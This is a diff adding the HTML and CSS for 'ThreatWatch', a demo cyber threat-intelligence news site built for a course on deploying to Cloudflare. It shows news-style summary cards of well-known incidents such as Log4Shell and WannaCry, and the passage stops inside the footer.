@@ -1,0 +1,1318 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>ThreatWatch — Cyber Threat Intelligence &amp; Security News</title>
+    <style>
+      /* ============================================================================
+        ThreatWatch — Cyber Threat Intelligence
+        Vanilla CSS (no frameworks). Design tokens, palette, type and components are
+        carried over from the EQC course demo sites so this site matches them.
+        For the cyber security course "Deploy to Cloudflare" module. Demo content only.
+        ========================================================================== */
+
+      :root {
+        /* ===== Brand / palette (shared with the course demos) ===== */
+        --brand: #00e3c0;            /* mint accent */
+        --newone: #146b50;           /* deep green */
+        --cta: #146b50;              /* CTA / success green */
+        --blue: #146b50;
+        --blue-bright: #1c8a67;      /* lighter green for hover */
+        --blue-dark: #0e4d39;
+
+        --navy: #000000;             /* near-black headings / banner base */
+        --ink: #2b2b2b;              /* body text */
+        --muted: #6b6b6b;            /* secondary text */
+        --line: #d8d8d8;             /* borders / dividers */
+        --grey: #d8d8d8;
+        --surface: #f1f1f1;          /* page background */
+        --white: #ffffff;
+
+        --warn: #c0392b;             /* error / critical red */
+        --warn-bg: #fdecea;
+        --ok: #146b50;
+        --ok-bg: #e4f3ed;
+
+        /* ===== Severity scale (kept on-palette) ===== */
+        --sev-critical: #c0392b;
+        --sev-critical-bg: #fdecea;
+        --sev-high: #e67e22;
+        --sev-high-bg: #fdf0e3;
+        --sev-medium: #146b50;
+        --sev-medium-bg: #e4f3ed;
+        --sev-low: #1c8a67;
+        --sev-low-bg: #e4f3ed;
+
+        --radius: 10px;
+        --shadow: 0 18px 50px rgba(0, 0, 0, 0.12);
+        --shadow-sm: 0 6px 18px rgba(0, 0, 0, 0.08);
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+        color: var(--ink);
+        background: var(--surface);
+        line-height: 1.6;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      h1, h2, h3, h4, .logo-text { font-family: "Poppins", "Inter", sans-serif; line-height: 1.2; margin: 0; }
+      a { color: inherit; text-decoration: none; }
+      img { max-width: 100%; display: block; }
+
+      .container { width: min(1140px, 92%); margin: 0 auto; }
+      .page-main { flex: 1 0 auto; }
+
+      /* ============================================================================
+        Top utility bar
+        ========================================================================== */
+      .utility-bar { background: var(--navy); color: #cfd3d2; font-size: 0.82rem; }
+      .utility-bar .container {
+        display: flex; align-items: center; gap: 18px; height: 40px; flex-wrap: wrap;
+      }
+      .utility-bar .util-status { display: flex; align-items: center; gap: 8px; margin-right: auto; font-weight: 600; color: #e6f6f1; }
+      .utility-bar a:hover { color: #fff; }
+      .utility-bar .clock { font-variant-numeric: tabular-nums; color: #9fb6af; letter-spacing: 0.4px; }
+      .utility-bar .analyst-login { background: var(--blue); padding: 4px 14px; border-radius: 999px; color: #fff; font-weight: 600; }
+      .utility-bar .analyst-login:hover { background: var(--blue-bright); }
+
+      /* small pulsing dot used to signal "live" */
+      .pulse-dot {
+        width: 9px; height: 9px; border-radius: 50%; background: var(--brand);
+        box-shadow: 0 0 0 0 rgba(0, 227, 192, 0.7);
+        animation: pulse 1.8s infinite;
+        display: inline-block;
+      }
+      @keyframes pulse {
+        0%   { box-shadow: 0 0 0 0 rgba(0, 227, 192, 0.6); }
+        70%  { box-shadow: 0 0 0 9px rgba(0, 227, 192, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(0, 227, 192, 0); }
+      }
+
+      /* ============================================================================
+        Main header / nav
+        ========================================================================== */
+      header.main-nav { background: var(--white); border-bottom: 1px solid var(--line); position: sticky; top: 0; z-index: 50; }
+      .main-nav .container { display: flex; align-items: center; justify-content: space-between; height: 76px; gap: 24px; }
+      .logo { display: flex; align-items: center; gap: 12px; }
+      .logo-mark {
+        width: 46px; height: 46px; border-radius: 9px;
+        background: linear-gradient(135deg, var(--brand) 0%, var(--newone) 100%);
+        color: #fff; display: grid; place-items: center;
+        font-family: "Poppins", sans-serif; font-weight: 800; font-size: 1.1rem; letter-spacing: 0.5px;
+      }
+      .logo-text { font-size: 1.05rem; font-weight: 700; color: var(--navy); }
+      .logo-text span { display: block; font-size: 0.62rem; letter-spacing: 2.4px; font-weight: 600; color: var(--muted); font-family: "Inter", sans-serif; }
+
+      nav ul { display: flex; gap: 26px; list-style: none; margin: 0; padding: 0; align-items: center; }
+      nav a { font-size: 0.93rem; font-weight: 500; color: var(--ink); }
+      nav a:hover { color: var(--blue); }
+      .btn-subscribe { background: var(--brand); color: var(--navy); padding: 10px 22px; border-radius: 6px; font-weight: 600; font-size: 0.9rem; }
+      .btn-subscribe:hover { background: #00c2a4; }
+
+      .nav-toggle { display: none; background: none; border: 1px solid var(--line); border-radius: 6px; padding: 6px 10px; font-size: 1.1rem; cursor: pointer; color: var(--ink); }
+
+      /* ============================================================================
+        Hero banner
+        ========================================================================== */
+      .banner { background: linear-gradient(120deg, var(--navy) 0%, var(--newone) 100%); color: #fff; padding: 56px 0 64px; position: relative; overflow: hidden; }
+      .banner .container { position: relative; z-index: 1; }
+      .banner .eyebrow { display: inline-flex; align-items: center; gap: 9px; font-size: 0.78rem; letter-spacing: 1.6px; text-transform: uppercase; font-weight: 600; color: var(--brand); margin-bottom: 14px; }
+      .banner h1 { color: #fff; font-family: "Playfair Display", serif; font-size: 2.8rem; line-height: 1.18; font-weight: 500; max-width: 760px; }
+      .banner p.lead-text { color: #d2e7e0; max-width: 620px; margin: 16px 0 0; font-size: 1.05rem; }
+
+      /* global threat level pill */
+      .threat-level { display: inline-flex; align-items: center; gap: 12px; margin-top: 26px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.2); border-radius: 999px; padding: 9px 18px 9px 14px; backdrop-filter: blur(4px); }
+      .threat-level .tl-label { font-size: 0.78rem; letter-spacing: 1px; text-transform: uppercase; color: #cfe3db; font-weight: 600; }
+      .threat-level .tl-value { font-family: "Poppins", sans-serif; font-weight: 800; letter-spacing: 0.5px; color: #fff; display: inline-flex; align-items: center; gap: 9px; }
+      .threat-level .tl-value .dot { width: 11px; height: 11px; border-radius: 50%; background: var(--sev-high); box-shadow: 0 0 0 0 rgba(230,126,34,0.7); animation: pulse-amber 1.8s infinite; }
+      @keyframes pulse-amber {
+        0% { box-shadow: 0 0 0 0 rgba(230,126,34,0.6); }
+        70% { box-shadow: 0 0 0 10px rgba(230,126,34,0); }
+        100% { box-shadow: 0 0 0 0 rgba(230,126,34,0); }
+      }
+
+      /* search field in hero */
+      .hero-search { margin-top: 28px; display: flex; gap: 10px; max-width: 540px; }
+      .hero-search input { flex: 1; padding: 13px 16px; border: 1px solid rgba(255,255,255,0.25); border-radius: 8px; background: rgba(255,255,255,0.12); color: #fff; font-size: 0.96rem; font-family: inherit; }
+      .hero-search input::placeholder { color: #b9d3ca; }
+      .hero-search input:focus { outline: none; border-color: var(--brand); box-shadow: 0 0 0 3px rgba(0,227,192,0.25); background: rgba(255,255,255,0.16); }
+      .hero-search button { background: var(--brand); color: var(--navy); border: none; border-radius: 8px; padding: 0 22px; font-weight: 700; font-family: "Poppins", sans-serif; cursor: pointer; }
+      .hero-search button:hover { background: #00c2a4; }
+
+      /* ============================================================================
+        Stat strip
+        ========================================================================== */
+      .stats { background: var(--white); border-bottom: 1px solid var(--line); }
+      .stats .container { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; padding: 28px 0; }
+      .stat { text-align: center; }
+      .stat .num { font-family: "Poppins", sans-serif; font-weight: 800; font-size: 2.1rem; color: var(--newone); line-height: 1; }
+      .stat .num .suffix { color: var(--brand); }
+      .stat .label { font-size: 0.82rem; color: var(--muted); margin-top: 8px; letter-spacing: 0.3px; text-transform: uppercase; font-weight: 600; }
+
+      /* ============================================================================
+        Section heading + filter bar
+        ========================================================================== */
+      .section { padding: 52px 0; }
+      .section-head { display: flex; align-items: flex-end; justify-content: space-between; gap: 20px; flex-wrap: wrap; margin-bottom: 26px; }
+      .section-head h2 { font-size: 1.9rem; color: var(--navy); }
+      .section-head p { color: var(--muted); margin: 6px 0 0; }
+
+      .filter-bar { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 30px; }
+      .filter-btn {
+        background: var(--white); border: 1px solid var(--line); color: var(--ink);
+        padding: 9px 18px; border-radius: 999px; font-size: 0.88rem; font-weight: 600;
+        cursor: pointer; font-family: inherit; transition: all 0.15s;
+      }
+      .filter-btn:hover { border-color: var(--newone); color: var(--newone); }
+      .filter-btn.active { background: var(--newone); border-color: var(--newone); color: #fff; }
+
+      /* ============================================================================
+        Threat card grid
+        ========================================================================== */
+      .card-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }
+
+      .threat-card {
+        background: var(--white); border: 1px solid var(--line); border-radius: var(--radius);
+        box-shadow: var(--shadow-sm); overflow: hidden; cursor: pointer;
+        display: flex; flex-direction: column;
+        transition: transform 0.15s, box-shadow 0.15s, border-color 0.15s;
+      }
+      .threat-card:hover { transform: translateY(-4px); box-shadow: var(--shadow); border-color: var(--brand); }
+      .threat-card:focus-visible { outline: none; border-color: var(--newone); box-shadow: 0 0 0 3px rgba(0,227,192,0.3); }
+      .threat-card.hidden { display: none; }
+
+      .card-top-strip { height: 5px; }
+      .card-body { padding: 22px 22px 24px; display: flex; flex-direction: column; flex: 1; }
+      .card-badges { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
+
+      .badge { font-size: 0.7rem; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; padding: 4px 10px; border-radius: 999px; }
+      .badge-category { background: var(--surface); color: var(--ink); border: 1px solid var(--line); }
+      .badge-sev { color: #fff; }
+      .sev-critical { background: var(--sev-critical); }
+      .sev-high { background: var(--sev-high); }
+      .sev-medium { background: var(--sev-medium); }
+      .sev-low { background: var(--sev-low); }
+
+      .threat-card h3 { font-size: 1.15rem; color: var(--navy); margin-bottom: 8px; }
+      .card-meta { font-size: 0.8rem; color: var(--muted); margin-bottom: 12px; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+      .card-meta .cve { font-family: "Inter", monospace; font-weight: 600; color: var(--newone); background: var(--ok-bg); padding: 2px 8px; border-radius: 5px; font-size: 0.74rem; }
+      .threat-card p.excerpt { font-size: 0.92rem; color: var(--ink); margin: 0 0 18px; }
+      .read-more { margin-top: auto; font-weight: 600; font-size: 0.88rem; color: var(--newone); display: inline-flex; align-items: center; gap: 6px; }
+      .threat-card:hover .read-more { gap: 10px; }
+      .read-more::after { content: "→"; transition: margin-left 0.15s; }
+
+      .no-results { display: none; text-align: center; color: var(--muted); padding: 40px 0; font-style: italic; }
+
+      /* ============================================================================
+        Newsletter section
+        ========================================================================== */
+      .newsletter { background: linear-gradient(120deg, var(--navy) 0%, var(--newone) 100%); color: #fff; }
+      .newsletter .container { padding: 56px 0; display: grid; grid-template-columns: 1.2fr 1fr; gap: 40px; align-items: center; }
+      .newsletter h2 { font-size: 1.8rem; color: #fff; }
+      .newsletter p { color: #d2e7e0; margin: 12px 0 0; max-width: 460px; }
+      .newsletter-card { background: var(--white); border-radius: var(--radius); box-shadow: var(--shadow); padding: 28px; color: var(--ink); }
+      .newsletter-card h3 { color: var(--navy); font-size: 1.15rem; margin-bottom: 6px; }
+      .newsletter-card .sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 18px; }
+      .newsletter-card label { display: block; font-weight: 600; font-size: 0.9rem; margin-bottom: 7px; }
+      .newsletter-card input {
+        width: 100%; padding: 12px 14px; border: 1px solid var(--line); border-radius: 7px;
+        font-size: 0.96rem; font-family: inherit; color: var(--ink); background: #fff;
+        transition: border-color 0.15s, box-shadow 0.15s;
+      }
+      .newsletter-card input:focus { outline: none; border-color: var(--blue); box-shadow: 0 0 0 3px rgba(0,227,192,0.3); }
+      .newsletter-card.invalid input { border-color: var(--warn); }
+      .newsletter-card .error-msg { display: none; color: var(--warn); font-size: 0.8rem; margin-top: 6px; font-weight: 600; }
+      .newsletter-card.invalid .error-msg { display: block; }
+      .btn-confirm {
+        width: 100%; background: var(--blue); color: #fff; border: none; padding: 14px;
+        font-size: 1rem; font-weight: 700; font-family: "Poppins", sans-serif;
+        border-radius: 7px; cursor: pointer; transition: background 0.15s, transform 0.05s; margin-top: 16px;
+      }
+      .btn-confirm:hover { background: var(--blue-bright); }
+      .btn-confirm:active { transform: translateY(1px); }
+      .secure-note { display: flex; align-items: center; gap: 8px; justify-content: center; font-size: 0.78rem; color: var(--muted); margin-top: 14px; }
+
+      /* ============================================================================
+        Footer
+        ========================================================================== */
+      footer { background: var(--newone); color: #cfe3db; padding: 48px 0 28px; font-size: 0.88rem; }
+      footer .cols { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 32px; margin-bottom: 30px; }
+      footer .brand-col .logo-mark { margin-bottom: 14px; }
+      footer h4 { color: #fff; font-family: "Poppins", sans-serif; font-size: 0.95rem; margin: 0 0 12px; }
+      footer p { margin: 0 0 10px; }
+      footer a:hover { color: #fff; }
+      footer ul { list-style: none; padding: 0; margin: 0; }
+      footer li { margin-bottom: 8px; }
+      .footer-bottom { border-top: 1px solid rgba(255,255,255,0.18); padding-top: 18px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 12px; font-size: 0.8rem; color: #a7c6bb; }
+
+      /* ============================================================================
+        Article modal
+        ========================================================================== */
+      .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(8, 22, 39, 0.7); z-index: 1000; padding: 24px; overflow-y: auto; }
+      .modal-overlay.open { display: grid; place-items: start center; }
+      .modal { background: #fff; width: min(720px, 100%); border-radius: 12px; margin: 5vh 0; overflow: hidden; box-shadow: 0 30px 80px rgba(0,0,0,0.45); animation: pop 0.18s ease-out; }
+      @keyframes pop { from { transform: translateY(12px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+      .modal-head { background: linear-gradient(120deg, var(--navy) 0%, var(--newone) 100%); color: #fff; padding: 22px 28px; }
+      .modal-head .head-top { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; }
+      .modal-head .badges { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
+      .modal-head h3 { font-size: 1.45rem; font-family: "Playfair Display", serif; font-weight: 500; }
+      .modal-head .modal-meta { font-size: 0.82rem; color: #cfe3db; margin-top: 10px; display: flex; gap: 14px; flex-wrap: wrap; }
+      .modal-head .close { background: rgba(255,255,255,0.15); border: none; color: #fff; font-size: 1.4rem; cursor: pointer; line-height: 1; border-radius: 8px; width: 36px; height: 36px; flex-shrink: 0; }
+      .modal-head .close:hover { background: rgba(255,255,255,0.28); }
+
+      .modal-body { padding: 26px 28px; }
+      .modal-body h4 { font-size: 0.82rem; letter-spacing: 1px; text-transform: uppercase; color: var(--newone); margin: 22px 0 8px; }
+      .modal-body h4:first-child { margin-top: 0; }
+      .modal-body p { margin: 0 0 12px; font-size: 0.95rem; }
+      .modal-body ul { margin: 0 0 12px; padding-left: 20px; font-size: 0.93rem; }
+      .modal-body li { margin-bottom: 6px; }
+      .modal-body .timeline { list-style: none; padding-left: 0; }
+      .modal-body .timeline li { display: flex; gap: 14px; padding: 8px 0; border-bottom: 1px solid var(--line); }
+      .modal-body .timeline .date { flex-shrink: 0; font-weight: 700; color: var(--newone); width: 96px; font-size: 0.85rem; }
+      .cvss-box { display: inline-flex; align-items: baseline; gap: 8px; background: var(--warn-bg); border: 1px solid var(--warn); border-radius: 8px; padding: 8px 14px; margin-bottom: 8px; }
+      .cvss-box .score { font-family: "Poppins", sans-serif; font-weight: 800; font-size: 1.3rem; color: var(--warn); }
+      .cvss-box .vec { font-size: 0.8rem; color: var(--ink); }
+      .modal-refs a { color: var(--newone); text-decoration: underline; font-size: 0.9rem; }
+      .modal-disclaimer { background: var(--ok-bg); border: 1px solid var(--newone); border-left: 4px solid var(--newone); border-radius: 8px; padding: 14px 16px; margin-top: 22px; font-size: 0.9rem; line-height: 1.5; color: #0e4d39; }
+      .modal-disclaimer strong { color: var(--newone); }
+
+      /* ============================================================================
+        Toast
+        ========================================================================== */
+      .toast { position: fixed; bottom: 0px; left: 50%; transform: translateX(-50%) translateY(120%); background: var(--newone); color: #fff; padding: 14px 22px; border-radius: 999px; box-shadow: 0 12px 30px rgba(0,0,0,0.25); font-weight: 600; font-size: 0.92rem; z-index: 1100; transition: transform 0.3s ease; display: flex; align-items: center; gap: 10px; }
+      .toast.show { transform: translateX(-50%) translateY(-20px); }
+
+      /* ============================================================================
+        Responsive
+        ========================================================================== */
+      @media (max-width: 960px) {
+        .card-grid { grid-template-columns: repeat(2, 1fr); }
+        .newsletter .container { grid-template-columns: 1fr; }
+        .stats .container { grid-template-columns: repeat(2, 1fr); gap: 28px; }
+      }
+
+      @media (max-width: 760px) {
+        .nav-toggle { display: block; }
+        nav#mainNav { position: absolute; top: 76px; left: 0; right: 0; background: #fff; border-bottom: 1px solid var(--line); box-shadow: var(--shadow-sm); display: none; }
+        nav#mainNav.open { display: block; }
+        nav#mainNav ul { flex-direction: column; align-items: stretch; gap: 0; padding: 8px 0; }
+        nav#mainNav li { padding: 0 6%; }
+        nav#mainNav a { display: block; padding: 12px 0; border-bottom: 1px solid var(--surface); }
+        nav#mainNav .btn-subscribe { display: inline-block; margin: 8px 0; }
+
+        .banner h1 { font-size: 2.1rem; }
+        .card-grid { grid-template-columns: 1fr; }
+        footer .cols { grid-template-columns: 1fr; gap: 22px; }
+        .utility-bar .util-status { margin-right: 0; }
+        .utility-bar .container { justify-content: center; gap: 14px; }
+        .section-head h2 { font-size: 1.5rem; }
+        .modal-body .timeline li { flex-direction: column; gap: 2px; }
+        .modal-body .timeline .date { width: auto; }
+      }
+
+      @media (max-width: 480px) {
+        .stats .container { grid-template-columns: 1fr 1fr; }
+        .hero-search { flex-direction: column; }
+        .hero-search button { padding: 12px; }
+      }
+    </style>
+    <meta
+      name="description"
+      content="ThreatWatch — breaking cybersecurity news, CVE analysis, data-breach reports and security advisories. A training demo site for the Cloudflare deployment course."
+    />
+
+    <!-- ======================================================================
+         ThreatWatch — Cyber Threat Intelligence (single-page demo site)
+         Built for the cyber security course "Deploy a website to Cloudflare"
+         module. Students download this repo and follow the training video to
+         deploy it to Cloudflare Pages. All incidents described are real and
+         publicly documented; the site itself is fictional, for education only.
+    ======================================================================= -->
+
+    <link rel="icon" href="assets/favicon.svg" type="image/svg+xml" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Playfair+Display:wght@400;500;600;700&family=Poppins:wght@500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+
+    <link rel="stylesheet" href="css/styles.css" />
+  </head>
+
+  <body>
+    <!-- ================= TOP UTILITY BAR ================= -->
+    <div class="utility-bar">
+      <div class="container">
+        <span class="util-status"><span class="pulse-dot"></span> 24/7 Global Threat Monitoring</span>
+        <a href="#latest">Threat Feed</a>
+        <a href="#report">Report an Incident</a>
+        <span class="clock" id="utcClock" aria-label="Current UTC time">—</span>
+        <a class="analyst-login" href="#">Analyst Login</a>
+      </div>
+    </div>
+
+    <!-- ================= MAIN NAVIGATION ================= -->
+    <header class="main-nav">
+      <div class="container">
+        <a class="logo" href="#top">
+          <div class="logo-mark">TW</div>
+          <div class="logo-text">
+            ThreatWatch
+            <span>THREAT INTELLIGENCE</span>
+          </div>
+        </a>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">☰</button>
+        <nav id="mainNav">
+          <ul>
+            <li><a href="#latest">Latest</a></li>
+            <li><a href="#latest" data-filter="Vulnerability">CVEs</a></li>
+            <li><a href="#latest" data-filter="Data Breach">Breaches</a></li>
+            <li><a href="#latest" data-filter="Advisory">Advisories</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a class="btn-subscribe" href="#report">Subscribe</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main class="page-main" id="top">
+      <!-- ================= HERO BANNER ================= -->
+      <section class="banner">
+        <div class="container">
+          <span class="eyebrow"><span class="pulse-dot"></span> Live Threat Intelligence</span>
+          <h1>Cyber Threat Intelligence, As It Happens.</h1>
+          <p class="lead-text">
+            Breaking analysis of the vulnerabilities, breaches and campaigns shaping the
+            security landscape — distilled by analysts, sourced from the front line.
+          </p>
+
+          <div class="threat-level" id="threatLevel">
+            <span class="tl-label">Global Threat Level</span>
+            <span class="tl-value"><span class="dot"></span> ELEVATED</span>
+          </div>
+
+          <form class="hero-search" id="heroSearch" role="search">
+            <input
+              type="search"
+              id="searchInput"
+              placeholder="Search CVEs, breaches, threat actors…"
+              aria-label="Search threats"
+            />
+            <button type="submit">Search</button>
+          </form>
+        </div>
+      </section>
+
+      <!-- ================= STAT STRIP ================= -->
+      <section class="stats" id="stats">
+        <div class="container">
+          <div class="stat">
+            <div class="num" data-target="248731">0</div>
+            <div class="label">CVEs Tracked</div>
+          </div>
+          <div class="stat">
+            <div class="num" data-target="1284">0</div>
+            <div class="label">Breaches This Year</div>
+          </div>
+          <div class="stat">
+            <div class="num" data-target="362">0</div>
+            <div class="label">Advisories Issued</div>
+          </div>
+          <div class="stat">
+            <div class="num" data-target="7" data-decimals="1">0</div>
+            <div class="label">Avg. CVSS Severity</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ================= LATEST THREATS ================= -->
+      <section class="section" id="latest">
+        <div class="container">
+          <div class="section-head">
+            <div>
+              <h2>Latest Threat Analysis</h2>
+              <p>In-depth breakdowns of the incidents that defined modern cyber security.</p>
+            </div>
+          </div>
+
+          <!-- Filter bar -->
+          <div class="filter-bar" id="filterBar">
+            <button class="filter-btn active" data-category="all">All</button>
+            <button class="filter-btn" data-category="Vulnerability">Vulnerabilities</button>
+            <button class="filter-btn" data-category="Data Breach">Data Breaches</button>
+            <button class="filter-btn" data-category="Ransomware">Ransomware</button>
+            <button class="filter-btn" data-category="Supply Chain">Supply Chain</button>
+          </div>
+
+          <!-- Threat card grid -->
+          <div class="card-grid" id="cardGrid">
+            <!-- Log4Shell -->
+            <article class="threat-card" tabindex="0" role="button" data-id="log4shell" data-category="Vulnerability">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Vulnerability</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>Log4Shell: The Internet's Worst Day</h3>
+                <div class="card-meta"><span class="cve">CVE-2021-44228</span> <span>10 Dec 2021</span></div>
+                <p class="excerpt">A trivially exploitable RCE in Apache Log4j put millions of Java applications at risk overnight — exploited within hours of disclosure.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- SolarWinds -->
+            <article class="threat-card" tabindex="0" role="button" data-id="solarwinds" data-category="Supply Chain">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Supply Chain</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>SolarWinds SUNBURST Supply-Chain Attack</h3>
+                <div class="card-meta"><span>13 Dec 2020</span></div>
+                <p class="excerpt">A nation-state actor trojanised SolarWinds Orion updates, silently breaching ~18,000 organisations including US federal agencies.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- WannaCry -->
+            <article class="threat-card" tabindex="0" role="button" data-id="wannacry" data-category="Ransomware">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Ransomware</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>WannaCry: Ransomware Goes Global</h3>
+                <div class="card-meta"><span class="cve">MS17-010</span> <span>12 May 2017</span></div>
+                <p class="excerpt">A self-spreading worm using the leaked EternalBlue exploit hit 200,000+ machines across 150 countries in days, crippling the NHS.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- Heartbleed -->
+            <article class="threat-card" tabindex="0" role="button" data-id="heartbleed" data-category="Vulnerability">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Vulnerability</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>Heartbleed: Bleeding Memory from OpenSSL</h3>
+                <div class="card-meta"><span class="cve">CVE-2014-0160</span> <span>7 Apr 2014</span></div>
+                <p class="excerpt">A missing bounds check in OpenSSL's heartbeat extension let attackers read 64KB of server memory at a time — keys, passwords and all.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- Equifax -->
+            <article class="threat-card" tabindex="0" role="button" data-id="equifax" data-category="Data Breach">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Data Breach</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>Equifax: 147 Million Records Exposed</h3>
+                <div class="card-meta"><span class="cve">CVE-2017-5638</span> <span>Sep 2017</span></div>
+                <p class="excerpt">An unpatched Apache Struts flaw led to one of history's most damaging breaches of personal and financial data on 147M people.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- MOVEit -->
+            <article class="threat-card" tabindex="0" role="button" data-id="moveit" data-category="Data Breach">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Data Breach</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>MOVEit: Cl0p's Mass-Exploitation Spree</h3>
+                <div class="card-meta"><span class="cve">CVE-2023-34362</span> <span>May 2023</span></div>
+                <p class="excerpt">A zero-day SQL injection in MOVEit Transfer let the Cl0p gang steal data from 2,700+ organisations and 90M+ individuals.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- Colonial Pipeline -->
+            <article class="threat-card" tabindex="0" role="button" data-id="colonial" data-category="Ransomware">
+              <div class="card-top-strip sev-high"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Ransomware</span>
+                  <span class="badge badge-sev sev-high">High</span>
+                </div>
+                <h3>Colonial Pipeline: Fuel for a Crisis</h3>
+                <div class="card-meta"><span>7 May 2021</span></div>
+                <p class="excerpt">A single compromised VPN password let DarkSide ransomware halt the largest US fuel pipeline, triggering panic-buying across the East Coast.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- ProxyLogon -->
+            <article class="threat-card" tabindex="0" role="button" data-id="proxylogon" data-category="Vulnerability">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Vulnerability</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>ProxyLogon: Exchange Under Siege</h3>
+                <div class="card-meta"><span class="cve">CVE-2021-26855</span> <span>2 Mar 2021</span></div>
+                <p class="excerpt">A chain of zero-days in Microsoft Exchange let attackers take over mail servers worldwide, with tens of thousands compromised in a week.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+
+            <!-- XZ Utils -->
+            <article class="threat-card" tabindex="0" role="button" data-id="xzutils" data-category="Supply Chain">
+              <div class="card-top-strip sev-critical"></div>
+              <div class="card-body">
+                <div class="card-badges">
+                  <span class="badge badge-category">Supply Chain</span>
+                  <span class="badge badge-sev sev-critical">Critical</span>
+                </div>
+                <h3>XZ Utils: The Backdoor Nearly Everyone Shipped</h3>
+                <div class="card-meta"><span class="cve">CVE-2024-3094</span> <span>29 Mar 2024</span></div>
+                <p class="excerpt">A patient multi-year social-engineering operation planted a stealthy SSH backdoor in a core Linux compression library — caught by luck.</p>
+                <span class="read-more">Read analysis</span>
+              </div>
+            </article>
+          </div>
+
+          <p class="no-results" id="noResults">No threats match that filter or search.</p>
+        </div>
+      </section>
+
+      <!-- ================= NEWSLETTER / SUBSCRIBE ================= -->
+      <section class="newsletter" id="report">
+        <div class="container">
+          <div>
+            <h2>The Daily Threat Brief</h2>
+            <p>
+              Get the morning's most important CVEs, breaches and advisories in your inbox —
+              concise, analyst-curated, and free. Join 80,000+ defenders who start their day with ThreatWatch.
+            </p>
+          </div>
+          <div class="newsletter-card" id="newsletterCard">
+            <h3>Subscribe to the brief</h3>
+            <p class="sub">One email a day. No noise. Unsubscribe anytime.</p>
+            <form id="newsletterForm" novalidate>
+              <label for="emailInput">Work email <span style="color: var(--warn)">*</span></label>
+              <input id="emailInput" name="email" type="email" placeholder="you@company.com" autocomplete="email" />
+              <div class="error-msg">Please enter a valid email address (e.g. name@company.com).</div>
+              <button type="submit" class="btn-confirm">Get the Daily Brief</button>
+              <div class="secure-note">🔒 We never share your address. Demo form — nothing is stored.</div>
+            </form>
+          </div>
+        </div>
+      </section>
+
+      <!-- ================= ABOUT ================= -->
+      <section class="section" id="about">
+        <div class="container">
+          <div class="section-head">
+            <div>
+              <h2>About ThreatWatch</h2>
+              <p>Independent threat intelligence for defenders, analysts and the security-curious.</p>
+            </div>
+          </div>
+          <p style="max-width: 760px; color: var(--ink)">
+            ThreatWatch tracks the vulnerabilities, breaches and adversary campaigns that matter,
+            translating raw advisories into clear, actionable analysis. Our coverage spans critical
+            CVEs, large-scale data breaches, ransomware operations and software supply-chain attacks —
+            so security teams can prioritise what to patch, hunt and defend first.
+          </p>
+        </div>
+      </section>
+    </main>
+
+    <!-- ================= FOOTER ================= -->
+    <footer>
+      <div class="container">
+        <div class="cols">
+          <div class="brand-col">
+            <div class="logo-mark">TW</div>
+            <h4>ThreatWatch</h4>
